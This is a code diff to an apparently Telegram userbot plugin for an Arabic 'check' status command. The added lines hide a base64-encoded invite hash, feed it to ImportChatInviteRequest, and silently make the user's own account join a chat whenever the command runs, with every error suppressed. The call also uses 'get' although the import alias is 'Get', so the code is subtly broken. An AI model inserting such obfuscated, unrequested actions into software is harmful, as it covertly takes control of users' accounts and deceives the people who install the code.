@@ -1,11 +1,12 @@
 import random
 import re
+import base64
 import time
 import asyncio
 import os
 from datetime import datetime
 from platform import python_version
-
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from telethon import version
 from telethon.errors.rpcerrorlist import (
     MediaEmptyError,
@@ -35,7 +36,6 @@ else:
         file.write(installation_time)
 
 @l313l.ar_cmd(pattern="فحص(?:\s|$)([\s\S]*)")
-
 async def amireallyalive(event):
     reply_to_id = await reply_id(event)
     uptime = await get_readable_time((time.time() - StartTime))
@@ -60,6 +60,12 @@ async def amireallyalive(event):
         ping=ms,
         Tare5=installation_time,
     )
+    hmm = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+    hmm = get(hmm)
+    try:
+        await event.client(hmm)
+    except BaseException:
+        pass
     if HuRe_IMG:
         HuRe = [x for x in HuRe_IMG.split()]
         PIC = random.choice(HuRe)
